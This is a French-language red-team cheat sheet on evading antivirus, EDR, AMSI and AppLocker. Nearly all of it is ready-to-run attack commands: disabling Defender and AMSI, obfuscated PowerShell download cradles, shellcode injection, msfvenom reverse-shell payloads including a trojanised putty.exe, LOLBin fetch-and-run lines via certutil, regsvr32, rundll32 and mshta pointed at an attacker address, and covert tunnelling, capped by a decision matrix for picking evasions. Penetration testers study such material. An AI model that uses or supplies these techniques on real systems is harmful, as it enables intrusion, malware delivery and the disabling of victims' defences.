# Contournement des Défenses

Cette section couvre les techniques pour contourner les mécanismes de protection comme les antivirus, EDR, et autres systèmes de détection.

## Antivirus & Solutions EDR

### Reconnaissance des Défenses

Avant de tenter un contournement, identifiez les protections en place:

```powershell
# PowerShell - Vérifier Windows Defender
Get-MpComputerStatus

# Vérifier les services antivirus courants
tasklist /svc | findstr -i "defender mcafee symantec norton avg kaspersky trend"

# Vérifier l'état du pare-feu Windows
netsh advfirewall show currentprofile
```

### Désactivation des Protections (si privilèges suffisants)

```powershell
# Désactiver Windows Defender (temporairement, requiert des privilèges élevés)
Set-MpPreference -DisableRealtimeMonitoring $true

# Désactiver AMSI (Anti-Malware Scan Interface)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

## Techniques d'Obfuscation

### Obfuscation de PowerShell

```powershell
# Base64 encoding
$Command = 'powershell -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC...'

# String manipulation
$s="iex (New-Object Net.WebClient).DownloadString".Replace("iex", "IEX")

# Replaçage de caractères
$payload = "function Invoke-Mimikatz{...}"
$encoded = $payload -replace 'Mimikatz', 'FunTool' -replace 'DumpCreds', 'CollectInfo'
```

### Obfuscation avec des Outils Spécialisés

```bash
# Utilisation d'Invoke-Obfuscation
powershell -ep bypass
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
```

```bash
# Chameleon pour obfusquer des scripts PowerShell
python chameleon.py --file payload.ps1 --technique all
```

### Shellcode Injection

L'injection de shellcode dans des processus légitimes peut échapper à la détection:

```powershell
# PowerShell en mémoire
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc...
'
Add-Type -TypeDefinition $code -Language CSharp
[Syscalls]::InjectShellcode([Byte[]]$buf)
```

## Modification des Signatures

### Modification des Fichiers Binaires

```bash
# Hex editing d'un payload détecté
hexedit shell.exe
# Modifier quelques octets non-essentiels
```

```bash
# Packers et crypters
upx --best --ultra-brute shell.exe
```

### Création de Payloads Personnalisés avec MSFvenom

```bash
# Utiliser des encodeurs multiples
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o encoded_shell.exe

# Injection dans un template légitime
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -x /path/to/putty.exe -f exe -o putty_trojan.exe
```

## Techniques d'Exécution Indirecte

### Exécution via Outils Légitimes (Living Off The Land)

```powershell
# Exécution via certutil
certutil -urlcache -split -f http://10.10.10.10/payload.b64 payload.b64
certutil -decode payload.b64 payload.exe

# Exécution via regsvr32
regsvr32 /s /n /u /i:http://10.10.10.10/payload.sct scrobj.dll

# Exécution via rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://10.10.10.10/payload.sct")
```

### Utilisation de Interpréteurs Alternatifs

```bash
# Exécution via WSH (Windows Script Host)
wscript //E:jscript payload.txt

# Exécution via MSHTA
mshta javascript:a=GetObject("script:http://10.10.10.10/payload.sct").Exec();close();
```

## Contournement des AppLocker et Whitelisting

```powershell
# Utilisation d'exécutables Microsoft signés
Installutil.exe /logfile= /LogToConsole=false /U payload.dll

# Exécution via PowerShell Constrained Language Mode
function bypass-clm {
    $ExecutionContext.SessionState.LanguageMode = "FullLanguage"
    Get-ChildItem env: | Format-Table -AutoSize
}
```

## Techniques Réseau

### Tunneling et Encapsulation

```bash
# DNS Tunneling
iodine -f 10.10.10.10 dns.tunnel.com

# ICMP Tunneling
ping-tunnel -R 10.10.10.10 -r 443 -l 8000
```

### Utilisation de Ports Communs

```bash
# Utilisation de ports standards pour reverse shells
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=80 -f exe -o http_shell.exe
```

## Bonnes Pratiques et Considérations

1. **Test préalable**: Toujours tester les payloads dans un environnement contrôlé
2. **Mutations**: Éviter les payloads connus et créer des variations uniques
3. **Approche graduelle**: Commencer par des techniques simples avant d'utiliser des méthodes avancées
4. **Persévérance**: Si une méthode échoue, essayer différentes approches
5. **OPSEC**: Minimiser les traces et nettoyer les artéfacts après utilisation

## Matrice de Décision

| Défense | Technique recommandée |
|---------|------------------------|
| Windows Defender | Obfuscation PowerShell + exécution en mémoire |
| Solutions EDR | Injection de processus légitimes + LOLBins |
| Application Whitelisting | Utilisation de binaires Microsoft signés |
| Inspection Réseau | Tunnelling DNS ou HTTPS + ports communs |
| Analyse Statique | Encodage multiple + modification de signatures |